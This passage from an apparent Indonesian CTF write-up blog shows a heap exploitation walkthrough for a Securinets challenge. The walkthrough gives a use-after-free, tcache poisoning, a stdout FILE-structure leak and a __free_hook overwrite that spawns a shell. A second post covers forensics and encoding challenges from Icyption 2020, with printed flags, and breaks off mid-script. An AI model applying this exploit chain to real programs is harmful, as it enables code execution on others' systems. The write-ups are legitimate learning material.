<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">__usercall</span> <span class="nf">subscribe</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
    <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

    <span class="kr">__asm</span> <span class="p">{</span> <span class="n">rep</span> <span class="n">nop</span> <span class="n">edx</span> <span class="p">}</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">49</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">is_active</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">gdata</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">);</span>
            <span class="n">is_active</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"Done"</span><span class="p">);</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
            <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"No more free slots!"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Unsubscribe, akan melakukan free terhadap suatu index array, dan mengeset is_active pada index ini menjadi 0.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">__usercall</span> <span class="nf">unsubscribe</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
    <span class="n">index</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"There is no such member"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">is_active</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">free</span><span class="p">(</span><span class="n">gdata</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"Done"</span><span class="p">);</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
            <span class="n">is_active</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Modify, melakukan read terhadap content member dengan constraint <code class="language-plaintext highlighter-rouge">0 &gt;= index &lt;= 50</code> yang mana index adalah pilihan dari user.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">__usercall</span> <span class="nf">modify</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@3</span>
    <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> <span class="c1">// [sp-Ch] [bp-Ch]@1</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
    <span class="n">index</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">50</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"There is no such member"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">gdata</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="mh">0x32uLL</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="bug">Bug</h3>

<p>Ada di fungsi unsubscribe, karena global data array pada index yang telah di-free tidak di-NULL kan. Sehingga, menimbulkan bug use-after-free. Dengan ini kita bisa mengedit chunk yang telah di free sehingga <code class="language-plaintext highlighter-rouge">FD</code> dan <code class="language-plaintext highlighter-rouge">BK</code> pointer chunk yang telah di free dapat kita kontrol untuk menunjuk kemanapun.</p>

<h3 id="information-leaks">Information Leaks</h3>

<p>Tantangannya adalah tidak ada fitur view. Leak bisa didapatkan dengan melakukan partial overwrite ke <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>. Cara ini membutuhkan bruteforce 1 byte dengan kemungkinan 1/16. Hal yang harus dilakukan adalah meng-corrupt <code class="language-plaintext highlighter-rouge">tcachebins</code> agar menunjuk ke <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>.</p>

<h3 id="exploit-3">Exploit</h3>

<p>Helper,</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">subscribe</span><span class="p">():</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">unsubscribe</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</code></pre></div></div>

<p>Karena subcsribe hanya melakukan <code class="language-plaintext highlighter-rouge">malloc</code> sebesar 0x50, kita perlu chunk yang besar agar jika di free, akan masuk ke <code class="language-plaintext highlighter-rouge">unsortedbins</code> sehingga, <code class="language-plaintext highlighter-rouge">FD</code> dan <code class="language-plaintext highlighter-rouge">BK</code> pointer menunjuk ke <code class="language-plaintext highlighter-rouge">main_arena</code> untuk melakukan partial overwrite.</p>

<p>Dengan use-after-free, edit <code class="language-plaintext highlighter-rouge">FD</code> pointer dari chunk yang sudah di-free agar menunjuk ke <code class="language-plaintext highlighter-rouge">chunk_size</code> dari suatu chunk yang berdekatan.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="nf">subscribe</span><span class="p">()</span>

<span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># tcachebins
# 0x60 [  2]: 0x555555559360 —▸ 0x5555555592a0 ◂— 0x0
</span></code></pre></div></div>

<p>kondisi ketiga chunks,</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x555555559290</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000061</span> <span class="o">&lt;-</span> <span class="n">heap_struct</span> <span class="n">of</span> <span class="n">chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">(</span><span class="n">free</span><span class="err">`</span><span class="n">d</span><span class="p">)</span>
<span class="mh">0x5555555592a0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000555555559010</span> <span class="o">&lt;-</span> <span class="n">tcachebins</span><span class="p">[</span><span class="mh">0x60</span><span class="p">][</span><span class="mi">1</span><span class="o">/</span><span class="mi">2</span><span class="p">]</span>
<span class="mh">0x5555555592b0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x5555555592c0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x5555555592d0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x5555555592e0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x5555555592f0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000061</span> <span class="o">&lt;-</span> <span class="n">heap_struct</span> <span class="n">of</span> <span class="n">chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="mh">0x555555559300</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559310</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559320</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559330</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559340</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559350</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000061</span> <span class="o">&lt;-</span> <span class="n">heap_struct</span> <span class="n">of</span> <span class="n">chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="p">(</span><span class="n">free</span><span class="err">`</span><span class="n">d</span><span class="p">)</span>
<span class="mh">0x555555559360</span><span class="p">:</span>   <span class="mh">0x00005555555592a0</span>  <span class="mh">0x0000555555559010</span> <span class="o">&lt;-</span> <span class="n">tcachebins</span><span class="p">[</span><span class="mh">0x60</span><span class="p">][</span><span class="mi">0</span><span class="o">/</span><span class="mi">2</span><span class="p">]</span>
<span class="mh">0x555555559370</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559380</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x555555559390</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x5555555593a0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x5555555593b0</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020c91</span> <span class="o">&lt;-</span> <span class="n">top_chunk</span>
</code></pre></div></div>

<p>Terlihat bahwa size dari <code class="language-plaintext highlighter-rouge">chunks[1]</code> yang terdapat pada alamat <code class="language-plaintext highlighter-rouge">0x5555555592f0</code>, ini hanya berbeda 1 byte LSB dengan <code class="language-plaintext highlighter-rouge">FD</code> dari <code class="language-plaintext highlighter-rouge">chunks[2]</code> pada <code class="language-plaintext highlighter-rouge">0x5555555592a0</code>. Yang diperlukan adalah edit LSB <code class="language-plaintext highlighter-rouge">FD</code> pointer <code class="language-plaintext highlighter-rouge">chunks[2]</code> ini ke <code class="language-plaintext highlighter-rouge">0xf8</code> agar mengarah ke size dari <code class="language-plaintext highlighter-rouge">chunks[1]</code>.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">modify</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xf8</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># tcachebins
# 0x60 [  2]: 0x555555559360 —▸ 0x5555555592f8 ◂— 0x61 /* 'a' */
</span></code></pre></div></div>

<p>Sekarang siapkan chunks padding untuk chunk dengan size yang besar nanti,</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">subscribe</span><span class="p">()</span> <span class="c1"># idx: 0
</span><span class="nf">subscribe</span><span class="p">()</span> <span class="c1"># idx: 2 -&gt; contains chunks[1]'s size
</span>
<span class="c1"># prepare chunks data for big size chunk (in this case: 0x420)
</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
    <span class="nf">subscribe</span><span class="p">()</span>

<span class="c1"># prevent consolidation with top_chunk
</span><span class="nf">subscribe</span><span class="p">()</span>
</code></pre></div></div>

<p>Edit size dari <code class="language-plaintext highlighter-rouge">chunks[1]</code> tadi menjadi <code class="language-plaintext highlighter-rouge">0x421</code> dan lakukan <code class="language-plaintext highlighter-rouge">free</code>, agar masuk ke <code class="language-plaintext highlighter-rouge">unsortedbins</code>.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">modify</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">))</span>

<span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># unsortedbin
# all: 0x5555555592f0 —▸ 0x7ffff7fbabe0 (main_arena+96) ◂— 0x5555555592f0
</span></code></pre></div></div>

<p>Sekarang siapkan chunks yang berdekatan, untuk men-corrupt tcachebins agar menunjuk ke <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="nf">subscribe</span><span class="p">()</span>

<span class="c1"># 2 bytes lsb of `\_IO_2_1_stdout_`
</span><span class="nf">modify</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0xb6a0</span><span class="p">))</span>

<span class="c1"># pwndbg&gt; dq 0x555555559480-0x10
# 0000555555559470     0000000000000000 0000000000000061
# 0000555555559480     00007ffff7fbb6a0 00007ffff7fbabe0
#                                    ^^ our chunk target
# 0000555555559490     0000000000000000 0000000000000000
# 00005555555594a0     0000000000000000 0000000000000000
</span></code></pre></div></div>

<p>Aku memilih <code class="language-plaintext highlighter-rouge">chunks[16]</code> menjadi target untuk <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code>. Siapkan free`d chunks yang berdekatan, agar chunks target dan salah <code class="language-plaintext highlighter-rouge">FD</code> pointer yang ada di <code class="language-plaintext highlighter-rouge">tcachabins</code> hanya berbeda 1 byte saja di LSB-nya, sehingga bisa kita overwrite agar menunjuk ke target.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
<span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
<span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># tcachebins
# 0x60 [  3]: 0x555555559300 —▸ 0x555555559420 —▸ 0x5555555593c0 ◂— 0x61 /* 'a' */
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">FD</code> Pointer dari <code class="language-plaintext highlighter-rouge">chunks[1]</code> yang menunjuk ke <code class="language-plaintext highlighter-rouge">0x555555559420</code> hanya berbeda 1 byte LSB-nya saja dengan chunk target kita yang berada di <code class="language-plaintext highlighter-rouge">0x555555559480</code>. Dengan mengubah 1 byte LSB dari <code class="language-plaintext highlighter-rouge">chunks[1]</code> menjadi <code class="language-plaintext highlighter-rouge">0x80</code>, tcachebins akan menunjuk ke chunk target kita.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">modify</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x80</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># tcachebins
# 0x60 [  3]: 0x555555559300 —▸ 0x555555559480 —▸ 0x7ffff7fbb6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
</span></code></pre></div></div>

<p>NOTE: Saya mematikan ASLR untuk mempermudah melakukan debugging.</p>

<p>Sekarang, overwrite file*struct <code class="language-plaintext highlighter-rouge">\_IO_2_1_stdout*</code>agar mencetak suatu alamat libc. Dengan mengoverwite 1 byte LSB dari<code class="language-plaintext highlighter-rouge">\_IO_write_base</code> ke suatu address yang menyimpan address libc.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="nf">subscribe</span><span class="p">()</span>

<span class="n">fake_struct</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
<span class="nf">modify</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">fake_struct</span><span class="p">)</span>
</code></pre></div></div>

<p>Ketika <code class="language-plaintext highlighter-rouge">_IO_2_1_stdout_</code> berhasil dioverwrite, maka program akan mengoutputkan suatu memory yang ditunjuk oleh <code class="language-plaintext highlighter-rouge">_IO_write_base</code> dan bisa dikalkulasi untuk mendapat libc leak.</p>

<p><img src="/assets/securinets-pwn/leak.png" alt="IMAGE leak" /></p>

<p>Karena leak sudah didapat, tinggal tcache-poisoning seperti biasa. Overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> menjadi system. Free chunk yang menyimpan string /bin/sh untuk dapat RCE !</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>

<span class="nf">modify</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__free_hook</span><span class="sh">'</span><span class="p">]))</span>

<span class="c1"># tcachebins
# 0x60 [  2]: 0x555555559720 —▸ 0x7ffff7fbdb28 (__free_hook) ◂— 0x0
</span>
<span class="nf">subscribe</span><span class="p">()</span>
<span class="nf">subscribe</span><span class="p">()</span>

<span class="nf">modify</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]))</span>

<span class="c1"># pwndbg&gt; tel &amp;__free_hook 1
# 00:0000│   0x7ffff7fbdb28 (__free_hook) —▸ 0x7ffff7e24410 (system) ◂— endbr64
</span>
<span class="nf">modify</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\0</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">unsubscribe</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
</code></pre></div></div>

<p>Tambahkan try except untuk otomasi bruteforce.</p>

<p><img src="/assets/securinets-pwn/test.png" alt="IMAGE test" /></p>

<p>Nice challanges!</p>

<h2 id="reference">Reference</h2>

<ul>
  <li><a href="http://blog.rh0gue.com/2017-12-31-34c3ctf-300/">http://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></li>
  <li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></li>
  <li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li>
  <li><a href="https://znqt.github.io/hitcon2018-babytcache/">https://znqt.github.io/hitcon2018-babytcache/</a></li>
</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[Overview]]></summary></entry><entry><title type="html">Final Icyption 2020</title><link href="http://localhost:4000/2020/08/07/final-icyption-2020.html" rel="alternate" type="text/html" title="Final Icyption 2020" /><published>2020-08-07T15:57:28+07:00</published><updated>2020-08-07T15:57:28+07:00</updated><id>http://localhost:4000/2020/08/07/final-icyption-2020</id><content type="html" xml:base="http://localhost:4000/2020/08/07/final-icyption-2020.html"><![CDATA[<p>Ini merupakan kompetisi CTF pertama yang saya ikuti, dan ini merupakan sebuah kickstart dan abuse untuk saya bahwa saya dapat berkontribusi di bidang ini. Special thanks to bl33dz yang telah mengundang saya untuk join ke tim nya (yang sebelumnya tim ini memiliki 3 anggota, karena sudah lulus satu diganti saya wkwk).</p>

<p><img src="/assets/icyp-final/scoreboard.png" alt="scoreboard" /></p>

<p>Yaaps, thats look like it. Kami menjuarai event tersebut, yeay. Tapi sayang, beasiswa hanya 1 untuk ketua tim, sad :’(</p>

<h2 id="love-on-the-weekend">Love On The Weekend</h2>

<p>Diberikan sebuah audio file yang bernama love on the weekend.mp3. Cek detail informasi file dengan exiftool didapat flag pada metadata Lyrics.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>exiftool love<span class="se">\ </span>on<span class="se">\ </span>the<span class="se">\ </span>weekend.mp3 | <span class="nb">grep</span> <span class="s1">'icyption{.*}'</span>
<span class="o">[</span>... REDACTED ...]
Love on the weekend icyption<span class="o">{</span>Do_y0u_l1k3_J0hn_May3r<span class="o">}</span><span class="nb">.</span>
<span class="o">[</span>... REDACTED ...]
</code></pre></div></div>

<h3 id="flag">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{Do_y0u_l1k3_J0hn_May3r}
</code></pre></div></div>

<h2 id="bitcoin-make-you-rich">Bitcoin Make You Rich</h2>

<p>Diberikan teks yang telah diencode yaitu sebagai berikut.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>J8pRND46rbHKmPuz4zWBNaWYzuo8uP6Kit4eFCnCgjGP7JWe8e9CVaK2LitS7CmeQdcCueM
</code></pre></div></div>

<p>Sempat stuck beberapa jam, karena saya kira base85 yang ternyata base58. Decode dengan base58 2 kali dan didapatkan flag.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'J8pRND46rbHKmPuz4zWBNaWYzuo8uP6Kit4eFCnCgjGP7JWe8e9CVaK2LitS7CmeQdcCueM'</span> | base58 <span class="nt">-d</span> | base58 <span class="nt">-d</span>
icyption<span class="o">{</span>satoshi_nakamoto_create_this<span class="o">}</span>
</code></pre></div></div>

<h3 id="flag-1">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{satoshi_nakamoto_create_this}
</code></pre></div></div>

<h2 id="something-wrong-with-this-drive">Something Wrong With This Drive</h2>

<p>Diberikan sebuah file data.img dimana command file pada linux tidak dapat mengetahui informasi file data.img yang menandakan file tersebut corrupt.</p>

<p>Fix file tersebut dengan e2fsck dan file berhasil diperbaiki.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file data.img 
data.img: Linux rev 1.0 ext2 filesystem data, <span class="nv">UUID</span><span class="o">=</span>6fdb6fa9-bc9c-4970-a0be-8ad1de6ea848 <span class="o">(</span>large files<span class="o">)</span>
</code></pre></div></div>

<p>Mount, dan didapatkan file gambar yang memuat flag.</p>

<p><img src="/assets/icyp-final/something-flag.jpg" alt="something-flag" /></p>

<h3 id="flag-2">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{f1n4lly_y0u_f1nd_m3}
</code></pre></div></div>

<h2 id="wonderful-painting">Wonderful Painting</h2>

<p>Diberikan file gambar bernama blahblah.jpg. Cek stereogram dengan stegsolve didapatkan flag tetapi sulit untuk dibaca. Cari tools online, didapatkan pada https://magiceye.ecksdee.co.uk/. Upload gambar dan geser-geser didapatkan flag seperti nama tim saya :)</p>

<p><img src="/assets/icyp-final/wonderfull-flag.png" alt="wonderfull-flag" /></p>

<h3 id="flag-3">Flag</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icyption{S3m0g4_K4mi_M3n4ng}
</code></pre></div></div>

<h2 id="sniff-sniff">Sniff Sniff</h2>

<p>Diberikan sebuah captured packet data (.pcap) yang berisi banyak paket usb. Filter:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>USB Transfer Type == 0x01
Frame Length == 72
Lalu, extract USB Data.
</code></pre></div></div>

<p>Extract dengan command</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>tshark <span class="nt">-r</span> monitor_snif.pcapng <span class="nt">-Y</span> <span class="s1">'usb.transfer_type == 0x01 &amp;&amp; frame.len == 72'</span> <span class="nt">-T</span> fields <span class="nt">-e</span> usb.capdata <span class="o">&gt;</span> usb-data.txt

<span class="nv">$ </span><span class="nb">cat </span>usb-data.txt | <span class="nb">head
</span>00:00:16:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:18:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:16:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:04:00:00:00:00:00
00:00:00:00:00:00:00:00
00:00:0b:00:00:00:00:00
00:00:00:00:00:00:00:00
</code></pre></div></div>

<p>Selanjutnya dilakukan mapping dengan python, berikut solvernya.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# coding: utf8
</span>
<span class="n">KEYBOARD_CODES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0x04</span><span class="p">:[</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x05</span><span class="p">:[</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x06</span><span class="p">:[</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x07</span><span class="p">:[</span><span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="p">],</span>    <span class="mh">0x08</span><span class="p">:[</span><span class="sh">'</span><span class="s">e</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">E</span><span class="sh">'</span><span class="p">],</span>
